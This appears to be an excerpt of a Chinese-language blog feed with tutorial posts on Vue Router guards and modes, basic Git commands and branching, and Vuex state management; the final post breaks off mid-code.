class="hljs-attr">beforeEnter</span>: <span class="hljs-function">(<span class="hljs-params">to, <span class="hljs-keyword">from</span>, next</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (to.meta.isAuth) &#123;<span class="hljs-comment">//去这两个路由加判断</span><br>        <span class="hljs-built_in">console</span>.log(to,<span class="hljs-keyword">from</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">localStorage</span>.getItem(<span class="hljs-string">&#x27;school&#x27;</span>)===<span class="hljs-string">&#x27;swpu&#x27;</span>)&#123;<br>            next()<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            alert(<span class="hljs-string">&#x27;权限不够&#x27;</span>)<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        next()<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>而且独享路由守卫只有前置守卫（beforeEnter）没有后置</p><p>后置路由守卫统一写到afterEach当中</p><h3 id="4-组件内路由守卫"><a href="#4-组件内路由守卫" class="headerlink" title="4.组件内路由守卫"></a>4.组件内路由守卫</h3><p>我们组件内部也可以加入路由守卫——分别是<code>beforeRouteEnter</code>和<code>beforeRouteLeave</code></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//使用路由规则，进入组件前</span><br>before<span class="hljs-constructor">RouteEnter(<span class="hljs-params">to</span>, <span class="hljs-params">from</span>, <span class="hljs-params">next</span>)</span> &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">to</span>.meta.isAuth) &#123;<br>    <span class="hljs-comment">//去这两个路由加判断</span><br>    console.log(<span class="hljs-keyword">to</span>, from);<br>    <span class="hljs-keyword">if</span> (localStorage.get<span class="hljs-constructor">Item(<span class="hljs-string">&quot;school&quot;</span>)</span><span class="hljs-operator"> === </span><span class="hljs-string">&quot;swpu&quot;</span>) &#123;<br>      next<span class="hljs-literal">()</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      alert(<span class="hljs-string">&quot;权限不够&quot;</span>);<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    next<span class="hljs-literal">()</span>;<br>  &#125;<br>&#125;,<br>beforeRouteLeave (<span class="hljs-keyword">to</span>, from, next) &#123;<br>  <span class="hljs-comment">//在离开组件前执行--保存数据。。。</span><br>  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="13-路由器的两种工作模式"><a href="#13-路由器的两种工作模式" class="headerlink" title="13.路由器的两种工作模式"></a>13.路由器的两种工作模式</h2><p>1.对于一个url来说，什么是hash值？——#及其以后的内容就是hash值</p><p>2.hash值不会包含在http请求中，即hash值不会带给服务器</p><p>3.hash模式：</p><p>​        1.地址中永远带着#号</p><p>​        2.若以后将地址通过第三方手机app分享，有可能会被标记不合法</p><p>​        3.兼容性较好</p><p>4.history模式：</p><p>​        1.地址干净</p><p>​        2.兼容性和hash模式相比略差</p><p>​        3.应用部署上线时需要后端人员支持，解决刷新页面报404的问题</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lasso">const router = <span class="hljs-literal">new</span> vueRouter(&#123;<br>    mode:<span class="hljs-string">&#x27;hash&#x27;</span>,<span class="hljs-comment">//这里设置模式</span><br>    routes: <br>    <span class="hljs-params">...</span><span class="hljs-params">...</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>vue</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Vue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Git</title>
    <link href="/2022/05/16/Git/"/>
    <url>/2022/05/16/Git/</url>
    
    <content type="html"><![CDATA[<h1 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h1><h2 id="什么是Git"><a href="#什么是Git" class="headerlink" title="什么是Git"></a>什么是Git</h2><p>相信大家在认识Git的时候都看到了这句话——Git是目前世界上最先进的分布式版本控制系统</p><p>但是Git到底能干什么呢？（这里用一张别人画的便于理解的图）</p><p><img src="D:\新建文件夹\文件\GitHub\pic\git\什么是git.png" alt="什么是git"></p><p>Workspace：工作区<br>Index / Stage：暂存区<br>Repository：仓库区（或本地仓库）<br>Remote：远程仓库</p><p>也许现在还不是很看得到这个图，继续看下去</p><h2 id="Git基本命令"><a href="#Git基本命令" class="headerlink" title="Git基本命令"></a>Git基本命令</h2><h3 id="1-git-config-–global"><a href="#1-git-config-–global" class="headerlink" title="1.git config –global"></a>1.git config –global</h3><p>这个命令用于设置你的用户名和邮箱，当然你可以为不同的仓库指定不同的用户名和邮箱</p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs verilog"><span class="hljs-comment">//设置用户名</span><br>git <span class="hljs-keyword">config</span> --<span class="hljs-keyword">global</span> user<span class="hljs-variable">.name</span> <span class="hljs-string">&quot;xxx&quot;</span><br><span class="hljs-comment">//设置邮箱</span><br>git <span class="hljs-keyword">config</span> --<span class="hljs-keyword">global</span> user<span class="hljs-variable">.emil</span> <span class="hljs-string">&quot;xxx&quot;</span><br></code></pre></td></tr></table></figure><h3 id="2-git-init"><a href="#2-git-init" class="headerlink" title="2.git init"></a>2.git init</h3><p>现在我们需要创建一个本地仓库（repository），新建一个文件夹，然后选择<code>Git Bush Here</code></p><p>然后输入<code>git init</code>，便把这个目录变成可以管理的仓库。</p><p>这个时候我们进入这个文件夹就可以看到我们的<code>.git </code>文件</p><p>如果看不到，应该是没有选择显示隐藏文件夹</p><p><img src="D:\新建文件夹\文件\GitHub\pic\git.git文件.png" alt="git文件"></p><h3 id="3-git-add，git-commit，git-status，git-diff"><a href="#3-git-add，git-commit，git-status，git-diff" class="headerlink" title="3.git add，git commit，git status，git diff"></a>3.git add，git commit，git status，git diff</h3><p>在最开始的图中我们可以看到<code>add</code>是链接我们的工作区和暂存区</p><p><code>git add xxx</code>就可以提交我们的一个文件到暂存区</p><p><code>git commit -m &quot;提交的注释&quot;</code>是将暂存区内容提交到仓库</p><p>![git commit](D:\新建文件夹\文件\GitHub\pic\git\git commit.png)</p><p><code>git status</code>参看是否还有文件未提交</p><p>如果我们对文件做了修改，<code>git status</code>就会飘红</p><p>这时候我们可以使用<code>git diff</code>参看哪里不一样</p><p>确认无误后再<code>git add</code>，<code>git commit</code></p><h3 id="4-git-log-，git-reset-–hard-HEAD-，git-checkout-–xxx"><a href="#4-git-log-，git-reset-–hard-HEAD-，git-checkout-–xxx" class="headerlink" title="4.git log ，git reset –hard HEAD^，git checkout  –xxx"></a>4.git log ，git reset –hard HEAD^，git checkout  –xxx</h3><p><code>git log</code>是显示提交日志</p><p><code>git reset --hard HEAD^</code>便是回退到上一个版本</p><p>上上个版本就是<code>git reset --hard HEAD^^</code></p><p>或者指定上100个版本<code>git reset --hard HEAD~100</code></p><p>更或者回到指定版本：</p><p>先试用<code>git reflog</code>参看版本号</p><p>然后<code>git reset --hard xxx</code></p><p>我们还可以参看内容<code>cat xxx</code></p><p>如果我们需要撤销修改和删除文件操作</p><p>执行<code>git checkout  --xxx</code></p><h3 id="5-删除文件"><a href="#5-删除文件" class="headerlink" title="5.删除文件"></a>5.删除文件</h3><p>当我们需要删除文件b时，一般会选择手动删除和<code>rm b.txt</code></p><p>但是如果是从版本库中删除呢？</p><p>那就是在删除之后commit提交一遍</p><p>在没有commit之前都是可以通过checkout恢复的</p><h2 id="远程仓库"><a href="#远程仓库" class="headerlink" title="远程仓库"></a>远程仓库</h2><h3 id="1-建立远程仓库"><a href="#1-建立远程仓库" class="headerlink" title="1.建立远程仓库"></a>1.建立远程仓库</h3><p>我们在GitHub上new repository，得到这样的页面</p><p><img src="D:\新建文件夹\文件\GitHub\pic\git\创建新仓库.png" alt="创建新仓库"></p><p>复制HTTPS的地址，然后Git Bush 输入</p><p><code>git remote add origin 复制的HTTPS</code>，这样便做好了一个本地和远程的链接</p><h3 id="2-git-push"><a href="#2-git-push" class="headerlink" title="2.git push"></a>2.git push</h3><p><code>git push</code>就是把本地仓库内容推送到远程</p><p>第一次推送的时候加上 -u <code>git push -u origin master</code></p><p>以后提交便可以<code>git push origin master</code></p><p>如果分支不是master</p><p>那么就是<code>git push origin 分支名</code></p><p>还有强制推送（不建议）</p><p><code>git push origin 分支名 -f</code></p><h3 id="3-删除本地和远程的链接"><a href="#3-删除本地和远程的链接" class="headerlink" title="3.删除本地和远程的链接"></a>3.删除本地和远程的链接</h3><p>使用<code>git remote rm origin</code>取消链接</p><h2 id="GitHub同步（克隆仓库）"><a href="#GitHub同步（克隆仓库）" class="headerlink" title="GitHub同步（克隆仓库）"></a>GitHub同步（克隆仓库）</h2><p>我们在写项目的时候，一般都是一个团队去完成一个项目，那么同步GitHub仓库就显得尤为重要。接下来介绍一下如何同步自己和别人的仓库。</p><h3 id="1-新建一个仓库"><a href="#1-新建一个仓库" class="headerlink" title="1. 新建一个仓库"></a>1. 新建一个仓库</h3><p><img src="D:\新建文件夹\文件\GitHub\pic\git\新建仓库.png" alt="新建仓库"></p><p>输入仓库名字，如何下面会有创建按钮</p><h3 id="2-创建文件夹用于克隆"><a href="#2-创建文件夹用于克隆" class="headerlink" title="2. 创建文件夹用于克隆"></a>2. 创建文件夹用于克隆</h3><p>我们在本机上创建一个文件夹，这个之后会存放我们的文件和代码</p><p>然后点击文件夹</p><p><img src="D:\新建文件夹\文件\GitHub\pic\git\克隆仓库.png" alt="克隆仓库"></p><p>点击<code>Git Bash Here</code>，输入<code>git clone xxxx</code>，xxxx是你<strong>想要克隆的仓库的https</strong></p><p><img src="D:\新建文件夹\文件\GitHub\pic\git\被克隆仓库.png" alt="被克隆仓库"></p><p>进入你想要克隆的仓库，点击Code可以看到</p><p><strong>这样我们的结果就是得到了别人仓库中的文件</strong></p><h3 id="3-上传到自己的仓库"><a href="#3-上传到自己的仓库" class="headerlink" title="3.上传到自己的仓库"></a>3.上传到自己的仓库</h3><p>接下来再在创建的文件夹<code>Git Bash Here</code> ，如果你现在只有一个仓库（新建的仓库是你的第一个仓库）——输入：</p><p><img src="C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20220516121230810.png" alt="image-20220516121230810"></p><p>如果这是你的第二个仓库——输入：</p><p><img src="D:\新建文件夹\文件\GitHub\pic\git\上传到仓库3.png" alt="上传到仓库3"></p><p>第x个仓库就是orginx</p><p>然后上传到master或者main分支：</p><p><img src="D:\新建文件夹\文件\GitHub\pic\git\上传到仓库2.png" alt="上传到仓库2"></p><h3 id="效果："><a href="#效果：" class="headerlink" title="效果："></a>效果：</h3><p><img src="D:\新建文件夹\文件\GitHub\pic\git\克隆仓库效果.png" alt="克隆仓库效果"></p><h2 id="Git创建与合并分支"><a href="#Git创建与合并分支" class="headerlink" title="Git创建与合并分支"></a>Git创建与合并分支</h2><p>我们的master叫做主分支，现在我们创建一个dev分支</p><p><code>git checkout -b dev</code>表示创建dev分支并切换</p><p>之后，我们可以使用<code>git branch</code> 参看分支</p><p>使用<code>git checkout 分支名</code>可以切换到指定分支</p><p>如果我们想要两个分支同步，使用<code>git merge dev</code>实现合并指定分支到当前分支上。</p><p>在执行完操作后记得commit 和push，而且<code>git push origin 分区名</code></p><p>查看分支：git branch</p><p>创建分支：git branch name</p><p>切换分支：git checkout name</p><p>创建+切换分支：git checkout –b name</p><p>合并某分支到当前分支：git merge name</p><p>删除分支：git branch –d name</p><h3 id="分支策略："><a href="#分支策略：" class="headerlink" title="分支策略："></a>分支策略：</h3><p>分支策略：首先master主分支应该是非常稳定的，也就是用来发布新版本，一般情况下不允许在上面干活，干活一般情况下在新建的dev分支上干活，干完后，比如上要发布，或者说dev分支代码稳定后可以合并到主分支master上来。</p><h2 id="多人协作"><a href="#多人协作" class="headerlink" title="多人协作"></a>多人协作</h2><p>参看远程库信息：<code>git remote</code></p><p>参看远程库详细信息：<code>git remote -v</code>、</p><h3 id="1-克隆分支"><a href="#1-克隆分支" class="headerlink" title="1.克隆分支"></a>1.克隆分支</h3><p><code>git clone 远程库地址</code>，此时目录下就会生成远程库文件</p><h3 id="2-推送分支"><a href="#2-推送分支" class="headerlink" title="2.推送分支"></a>2.推送分支</h3><p>比如我们要在dev分支上开发，那么我们就需要在克隆的库中建立一个dev分支 <code>git checkout -b dev origin/dev</code></p><p>推送分支就是使用我们的<code>git push origin dev</code></p><h3 id="3-get-pull"><a href="#3-get-pull" class="headerlink" title="3.get pull"></a>3.get pull</h3><p><code>git pull </code>的本质是 <code>git fetch</code> +<code>git merge</code></p><p> <code>git fetch</code>是从远端获取最新版本到本地，但是不会合并分支</p><p><code>git merge</code>就帮助我们合并了分支</p><p>还有一个<code>git pull --rebase</code></p><p>rebase 另外一个分支是将另外一个分支的所有版本复制到自己分支后面</p><p>这个是rebase：</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"> <span class="hljs-comment">A</span>--<span class="hljs-literal">-</span><span class="hljs-comment">B</span>--<span class="hljs-literal">-</span><span class="hljs-comment">C</span> <span class="hljs-comment">topic</span><br><span class="hljs-comment">/</span>        <br>  <span class="hljs-comment">D</span>--<span class="hljs-literal">-</span><span class="hljs-comment">E</span>--<span class="hljs-literal">-</span><span class="hljs-comment">F</span>--<span class="hljs-literal">-</span><span class="hljs-comment">G</span>--<span class="hljs-literal">-</span><span class="hljs-comment">H</span> --<span class="hljs-literal">-</span><span class="hljs-comment">A&#x27;</span>--<span class="hljs-literal">-</span><span class="hljs-comment">B&#x27;</span>--<span class="hljs-literal">-</span><span class="hljs-comment">C&#x27;master</span><br></code></pre></td></tr></table></figure><p>这个是pull：</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"> <span class="hljs-comment">A</span>--<span class="hljs-literal">-</span><span class="hljs-comment">B</span>--<span class="hljs-literal">-</span><span class="hljs-comment">C</span> <span class="hljs-comment">topic</span><br><span class="hljs-comment">/</span>         <span class="hljs-comment">\</span><br>  <span class="hljs-comment">D</span>--<span class="hljs-literal">-</span><span class="hljs-comment">E</span>--<span class="hljs-literal">-</span><span class="hljs-comment">F</span>--<span class="hljs-literal">-</span><span class="hljs-comment">G</span>--<span class="hljs-literal">-</span><span class="hljs-comment">H</span> <span class="hljs-comment">master</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Github</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vuex</title>
    <link href="/2022/05/16/vuex/"/>
    <url>/2022/05/16/vuex/</url>
    
    <content type="html"><![CDATA[<h1 id="vuex"><a href="#vuex" class="headerlink" title="vuex"></a>vuex</h1><h2 id="1-为什么是vuex"><a href="#1-为什么是vuex" class="headerlink" title="1.为什么是vuex"></a>1.为什么是vuex</h2><p>为什么我们需要vuex，我们首先想象一个案例，一个组件的x属性，需要传给其他组件，我们会想到全局事件总线。但同时，这个数据也可以被其他组件修改，这个时候全局事件总线就会显得有一点繁琐。于是我们引入vuex–<strong>既然你的数据共享度那么高，为何不解耦放入一个特定的地方。</strong></p><p><img src="https://s2.loli.net/2022/05/16/sDnkBb1StiUg4jL.png" alt="vuex图解.png"></p><p>我们的vuex的使用场景就是：（简单来说就是共享）</p><p>1.多个组件依赖于同一个状态  2.不同组件改变同一个状态</p><h2 id="2-vuex组成部分"><a href="#2-vuex组成部分" class="headerlink" title="2.vuex组成部分"></a>2.vuex组成部分</h2><p>在vue的官网上给出了vuex的一张图片，解释了vuex 的运行过程：</p><p><img src="https://s2.loli.net/2022/05/16/XiMn32QqoOWgIfz.png" alt="vuex组成.png"></p><p>其中Action，Mutations，State都是vuex的组成部分，而且<strong>都为对象。</strong></p><p>State中保存数据，数据可以是数组等=》（通过render渲染）形成Vue Components =》这个时候调用dispatch 传入Action，结合后端数据，形成一个function，而这个function中就有我们的commit函数=》commit函数传值给Mutations，也得到一个key 和一个function，这个时候的function可以得到我们的 State，通过State改变数据=》达到管理数据的作用</p><p>三个组成部分有一个总的管理者–store，所调用的dispatch和commit都是store下的方法</p><p><img src="https://s2.loli.net/2022/05/16/YT65jPvhAft9Hki.png" alt="store.png"></p><h2 id="3-创建vuex环境"><a href="#3-创建vuex环境" class="headerlink" title="3.创建vuex环境"></a>3.创建vuex环境</h2><p>我们首先安装vuex，vue3使用<code>npm i vuex@4</code>，vue2使用<code>npm i vuex@3</code></p><h3 id="1-创建文件"><a href="#1-创建文件" class="headerlink" title="1.创建文件"></a>1.创建文件</h3><p>在src/store/index.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//该文件用于创建store</span><br><span class="hljs-comment">//引入vue</span><br><span class="hljs-keyword">import</span> Vue <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;vue&quot;</span>;<br><span class="hljs-comment">//引入vuex</span><br><span class="hljs-keyword">import</span> Vuex <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;vuex&quot;</span>;<br><span class="hljs-comment">//使用vuex，vuex的使用一定要在store创建之前</span><br>Vue.use(Vuex)<br><span class="hljs-comment">//响应组件中的动作</span><br><span class="hljs-keyword">const</span> actions =&#123;&#125;<br><span class="hljs-comment">//操作数据</span><br><span class="hljs-keyword">const</span> mutations = &#123;&#125;<br><span class="hljs-comment">//存储数据</span><br><span class="hljs-keyword">const</span> state = &#123;&#125;<br><br><span class="hljs-comment">//创建store并导出</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">new</span> Vuex.Store(&#123;<br>    actions,<br>    mutations,<br>    state,<br>&#125;)<br></code></pre></td></tr></table></figure><h3 id="2-在main-js中导入"><a href="#2-在main-js中导入" class="headerlink" title="2.在main.js中导入"></a>2.在main.js中导入</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> Vue <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span><br><span class="hljs-keyword">import</span> App <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./App.vue&#x27;</span><br><span class="hljs-comment">//引入vue-resource</span><br><span class="hljs-keyword">import</span> VueResource <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue-resource&#x27;</span><br><span class="hljs-comment">//引入store</span><br><span class="hljs-keyword">import</span> store <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./store&#x27;</span><span class="hljs-comment">//因为index.js是默认文件，所以只写文件夹的名字</span><br>Vue.config.productionTip = <span class="hljs-literal">false</span><br>Vue.use(VueResource)<br><br><span class="hljs-keyword">new</span> Vue(&#123;<br>    <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#app&#x27;</span>,<br>    <span class="hljs-attr">render</span>: <span class="hljs-function"><span class="hljs-params">h</span> =&gt;</span> h(App),<br>    <span class="hljs-comment">//传入store配置项</span><br>    store,<br>    <span class="hljs-function"><span class="hljs-title">beforeCreate</span>(<span class="hljs-params"></span>)</span> &#123;<br>        Vue.prototype.$bus = <span class="hljs-built_in">this</span><span class="hljs-comment">//加入事件总线</span><br>    &#125;,<br>&#125;)<br></code></pre></td></tr></table></figure><h2 id="4-通过vuex完成加法处理器"><a href="#4-通过vuex完成加法处理器" class="headerlink" title="4.通过vuex完成加法处理器"></a>4.通过vuex完成加法处理器</h2><h3 id="1-完成加减运算"><a href="#1-完成加减运算" class="headerlink" title="1.完成加减运算"></a>1.完成加减运算</h3><p>需求：一个下拉选择框，可以选择3个数字，两个 button，一个是+，一个是-，一个显示得到的总和</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs javascript">     <span class="hljs-comment">//html</span><br>     &lt;h1&gt;当前求和为：&#123;&#123;$store.state.sum&#125;&#125;&lt;/h1&gt;<br>     &lt;!-- 需要传输的是数字，添加一个.number --&gt;<br>     <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">v-model.number</span>=<span class="hljs-string">&quot;n&quot;</span>&gt;</span></span><br><span class="xml">       <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span></span><br><span class="xml">       <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span></span><br><span class="xml">       <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;3&quot;</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span></span><br><span class="xml">     <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></span><br>     <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;increment&quot;</span>&gt;</span>+<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span> <br>     <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;decrement&quot;</span>&gt;</span>-<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br>     <br>     <span class="hljs-comment">//button逻辑</span><br>     <span class="hljs-function"><span class="hljs-title">increment</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-built_in">this</span>.$store.dispatch(<span class="hljs-string">&#x27;add&#x27;</span>,<span class="hljs-built_in">this</span>.n)<br>      &#125;,<br>      <span class="hljs-function"><span class="hljs-title">decrement</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-built_in">this</span>.$store.dispatch(<span class="hljs-string">&#x27;sub&#x27;</span>,<span class="hljs-built_in">this</span>.n)<br>      &#125;,<br>      <br>      <span class="hljs-comment">//index.js</span><br> <span class="hljs-keyword">const</span> actions = &#123;<br>    <span class="hljs-function"><span class="hljs-title">add</span>(<span class="hljs-params">context, value</span>)</span> &#123;<span class="hljs-comment">//context为上下文，类似于一个minstore</span><br>        context.commit(<span class="hljs-string">&#x27;ADD&#x27;</span>, value)<br>    &#125;,<br>    <span class="hljs-function"><span class="hljs-title">sub</span>(<span class="hljs-params">context, value</span>)</span> &#123;<br>        context.commit(<span class="hljs-string">&#x27;SUB&#x27;</span>, value)<br>    &#125;,<br>&#125;,<br><span class="hljs-keyword">const</span> mutations = &#123;<br>    <span class="hljs-function"><span class="hljs-title">ADD</span>(<span class="hljs-params">state, value</span>)</span> &#123;<br>        state.sum += value<br>    &#125;,<br>    <span class="hljs-function"><span class="hljs-title">SUB</span>(<span class="hljs-params">state, value</span>)</span> &#123;<br>        state.sum -= value<br>    &#125;,<br>&#125;<br></code></pre></td></tr></table></figure><p>组件通过dispatch传输数据给action，action中匹配key值，然后commit数据给mutation，mutation中实际操作数据，并影响state。</p><h3 id="2-实现条件执行"><a href="#2-实现条件执行" class="headerlink" title="2.实现条件执行"></a>2.实现条件执行</h3><p>需求：我们需要添加两个功能，一个是在sum是奇数时才能继续加操作，一个是在点击按钮后一段时间后执行加操作</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs typescript">  <span class="hljs-comment">//html按钮</span><br>  &lt;button <span class="hljs-meta">@click</span>=<span class="hljs-string">&quot;incrementOdd&quot;</span>&gt;当前求和奇数再加&lt;/button&gt; <br>  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;incrementWait&quot;</span>&gt;</span>等一等再加<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span> <br>  <br>  <span class="hljs-comment">//click函数</span><br>  <span class="hljs-function"><span class="hljs-title">incrementOdd</span>(<span class="hljs-params"></span>)</span>&#123;<br>     <span class="hljs-built_in">this</span>.$store.dispatch(<span class="hljs-string">&#x27;addOdd&#x27;</span>,<span class="hljs-built_in">this</span>.n)<br>   &#125;,<br>   <span class="hljs-function"><span class="hljs-title">incrementWait</span>(<span class="hljs-params"></span>)</span>&#123;<br>     <span class="hljs-built_in">this</span>.$store.dispatch(<span class="hljs-string">&#x27;addWait&#x27;</span>,<span class="hljs-built_in">this</span>.n)<br>   &#125;<br>   <br>   <span class="hljs-comment">//index.js--action</span><br><span class="hljs-function"><span class="hljs-title">addOdd</span>(<span class="hljs-params">context, value</span>)</span> &#123;<br>     <span class="hljs-keyword">if</span> (context.state.sum % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>) &#123;<span class="hljs-comment">//sum在context中的state中</span><br>         context.commit(<span class="hljs-string">&#x27;ADD&#x27;</span>, value)<br>     &#125;<br> &#125;,<br> <span class="hljs-function"><span class="hljs-title">addWait</span>(<span class="hljs-params">context, value</span>)</span> &#123;<br>     <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>         context.commit(<span class="hljs-string">&#x27;ADD&#x27;</span>, value)<br>     &#125;, <span class="hljs-number">500</span>);<br> &#125;,<br></code></pre></td></tr></table></figure><p>这两个最大的特点便是–条件执行，一个是判断，一个是定时器。而这两个逻辑都加载在了<strong>action</strong>中，我们的mutations只负责操作，而action负责数据的逻辑处理，什么时候调用这些操作。</p><h2 id="5-getters"><a href="#5-getters" class="headerlink" title="5.getters"></a>5.getters</h2><p>当state中的数据需要加工后再使用时，我们需要一个类似computed的配置项——getters</p><p>getters既然是配置项，那么我们需要在index.js 中加入</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pf">//准备getters-用于将<span class="hljs-keyword">state</span>中是数据进行加工<br><span class="hljs-keyword">const</span> getters = &#123;<br>    bigSum(<span class="hljs-keyword">state</span>)&#123;<br>        return <span class="hljs-keyword">state</span>.sum*<span class="hljs-number">10</span><br>    &#125;<br>&#125;<br>//记得暴露出去<br>export <span class="hljs-keyword">default</span> new Vuex.Store(&#123;<br>    actions,<br>    mutations,<br>    <span class="hljs-keyword">state</span>,<br>    getters,//新建暴露<br>&#125;)<br></code></pre></td></tr></table></figure><p>然后bigSum存在store新建项的getters中</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml"><span class="hljs-tag">&lt;<span 